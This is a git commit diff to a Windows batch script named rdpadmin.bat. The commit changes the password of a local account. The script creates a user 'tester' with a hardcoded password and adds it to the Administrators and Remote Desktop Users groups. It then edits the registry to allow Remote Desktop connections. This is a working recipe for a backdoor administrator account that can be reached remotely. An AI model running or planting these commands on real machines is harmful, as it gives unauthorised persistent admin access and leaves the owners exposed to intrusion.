76cb26d16c87f6a72f4fe259128fa9fb30d0524c
blu0 <14917117+blu0@users.noreply.github.com>
2018-04-04 15:41:31 -0500

    Update rdpadmin.bat

--- rdpadmin.bat
+++ rdpadmin.bat
@@ -1,6 +1,6 @@
 
 @echo on
-net user tester testing /ADD
+net user tester Testing123! /ADD
 net localgroup administrators tester /ADD
 net localgroup "Remote Desktop Users" tester /ADD
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
